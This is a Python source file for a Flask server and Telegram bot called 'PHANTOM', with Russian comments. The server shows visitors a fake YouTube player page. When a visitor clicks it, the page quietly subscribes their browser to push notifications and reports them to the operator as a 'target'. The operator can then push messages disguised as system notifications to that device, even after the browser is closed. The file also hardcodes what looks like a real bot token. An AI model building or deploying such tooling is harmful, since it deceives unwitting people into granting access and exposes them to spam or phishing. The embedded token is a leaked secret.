import asyncio, threading, requests, json, os, base64
from flask import Flask, render_template_string, request, jsonify
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from pywebpush import webpush, WebPushException

# --- [1] CONFIG & VAPID KEYS ---
# Эти ключи позволяют слать пуши на ЗАКРЫТЫЙ браузер
VAPID_PUBLIC_KEY = "BE-YOUR-PUBLIC-KEY-HERE" 
VAPID_PRIVATE_KEY = "YOUR-PRIVATE-KEY-HERE"
VAPID_CLAIMS = {"sub": "mailto:admin@gmail.com"}

API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Хранилище подписок (в памяти для скорости)
subscriptions = {} 

# --- [2] SERVICE WORKER (Ядро фоновой работы) ---
SW_JS = """
self.addEventListener('push', function(event) {
    const data = event.data.json();
    const options = {
        body: data.body,
        icon: 'https://www.google.com/favicon.ico',
        vibrate: [200, 100, 200],
        data: { url: data.url }
    };
    event.waitUntil(self.registration.showNotification(data.title, options));
});

self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    event.waitUntil(clients.openWindow(event.notification.data.url));
});
"""

# --- [3] UI (Минималистичный плеер) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="margin:0; background:#000; height:100vh; overflow:hidden;" onclick="setup()">
    <div id="p" style="width:100%; height:100%; background:url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; display:flex; align-items:center; justify-content:center;">
        <div style="width:70px; height:45px; background:red; border-radius:10px; position:relative;">
            <div style="position:absolute; left:28px; top:13px; border-left:18px solid #fff; border-top:10px solid transparent; border-bottom:10px solid transparent;"></div>
        </div>
    </div>
<script>
const publicKey = "{{public_key}}";

function urlBase64ToUint8Array(base64String) {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
    const rawData = window.atob(base64);
    return Uint8Array.from([...rawData].map((char) => char.charCodeAt(0)));
}

async function setup() {
    if ('serviceWorker' in navigator) {
        try {
            const reg = await navigator.serviceWorker.register('/sw.js');
            const sub = await reg.pushManager.subscribe({
                userVisibleOnly: true,
                applicationServerKey: urlBase64ToUint8Array(publicKey)
            });
            await fetch('/subscribe', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({sid: "{{sid}}", sub: sub})
            });
        } catch (e) { console.error(e); }
    }
    Notification.requestPermission();
    setTimeout(() => { location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1000);
}
</script>
</body></html>
"""

# --- [4] FLASK ROUTES ---
@app.route('/sw.js')
def serve_sw(): return SW_JS, 200, {'Content-Type': 'application/javascript'}

@app.route('/ping')
def ping(): return "OK", 200

@app.route('/v/<sid>')
def view(sid): 
    return render_template_string(HTML_TEMPLATE, sid=sid, public_key=VAPID_PUBLIC_KEY)

@app.route('/subscribe', methods=['POST'])
def subscribe():
    data = request.get_json()
    subscriptions[data['sid']] = data['sub']
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": int(data['sid']), "text": "✅ **ЦЕЛЬ ПОДПИСАНА**\\nТеперь пуши будут приходить даже при закрытом браузере."})
    return "OK"

# --- [5] BOT CONTROL ---
@dp.message(Command("start"))
async def cmd_start(m: types.Message):
    await m.answer(f"🕶 **PHANTOM v49.0 | ETERNAL**\\n🔗 Ссылка: `{BASE_URL}/v/{m.from_user.id}`")

@dp.message(F.text)
async def send_push(m: types.Message):
    sid = str(m.from_user.id)
    if sid not in subscriptions:
        return await m.answer("❌ У вас нет активных целей.")
    
    await m.answer("📡 Отправка фонового сигнала...")
    try:
        webpush(
            subscription_info=subscriptions[sid],
            data=json.dumps({
                "title": "Системное уведомление",
                "body": m.text,
                "url": "https://google.com"
            }),
            vapid_private_key=VAPID_PRIVATE_KEY,
            vapid_claims=VAPID_CLAIMS
        )
        await m.answer("✅ Сообщение доставлено на устройство (даже если браузер закрыт).")
    except WebPushException as ex:
        await m.answer(f"❌ Ошибка доставки: {ex}")

async def main():
    # Запуск сервера и бота одновременно
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
